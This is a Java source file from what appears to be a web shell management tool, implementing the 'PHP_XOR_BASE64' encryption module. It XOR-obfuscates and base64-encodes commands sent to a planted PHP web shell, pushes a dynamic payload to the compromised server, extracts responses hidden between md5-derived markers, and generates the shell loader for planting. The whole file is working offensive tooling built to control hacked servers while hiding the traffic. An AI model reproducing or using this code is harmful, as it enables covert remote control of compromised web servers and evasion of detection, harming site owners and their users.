package vip.youwe.shell.shells.cryptions.phpXor;

import vip.youwe.shell.core.annotation.CryptionAnnotation;
import vip.youwe.shell.core.imp.Cryption;
import vip.youwe.shell.core.shell.ShellEntity;
import vip.youwe.shell.utils.Log;
import vip.youwe.shell.utils.functions;
import vip.youwe.shell.utils.http.Http;

import java.net.URLEncoder;

@CryptionAnnotation(Name = "PHP_XOR_BASE64", payloadName = "PhpDynamicPayload")
public class PhpXor implements Cryption {

    private ShellEntity shell;
    private Http http;
    private byte[] key;
    private boolean state;
    private String pass;
    private byte[] payload;
    private String findStrLeft;
    private String findStrRight;

    public void init(ShellEntity context) {
        this.shell = context;
        this.http = this.shell.getHttp();
        this.key = this.shell.getSecretKeyX().getBytes();
        this.pass = this.shell.getPassword();
        String findStrMd5 = functions.md5(this.pass + this.key);
        this.findStrLeft = findStrMd5.substring(0, 16);
        this.findStrRight = findStrMd5.substring(16);
        try {
            this.payload = this.shell.getPayloadModel().getPayload();
            if (this.payload != null) {
                this.http.sendHttpResponse(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception e) {
            Log.error(e);
            return;
        }
    }

    public byte[] encode(byte[] data) {
        try {
            return E(data);
        } catch (Exception e) {
            Log.error(e);
            return null;
        }
    }

    public byte[] decode(byte[] data) {
        if (data != null && data.length > 0) {
            try {
                return D(findStr(data));
            } catch (Exception e) {
                Log.error(e);
                return null;
            }
        }
        return data;
    }

    public boolean isSendRLData() {
        return true;
    }

    public byte[] E(byte[] data) {
        byte[] cs = functions.base64Encode(data).getBytes();
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[i + 1 & 0xF]);
        }
        return (this.pass + "=" + URLEncoder.encode(functions.base64Encode((new String(cs)).getBytes()))).getBytes();
    }

    public byte[] D(String data) {
        byte[] cs = functions.base64Decode(data);
        int len = cs.length;
        for (int i = 0; i < len; i++) {
            cs[i] = (byte) (cs[i] ^ this.key[i + 1 & 0xF]);
        }
        return functions.base64Decode(new String(cs));
    }

    public String findStr(byte[] respResult) {
        String htmlString = new String(respResult);
        return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
    }


    public boolean check() {
        return this.state;
    }


    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
    }
}
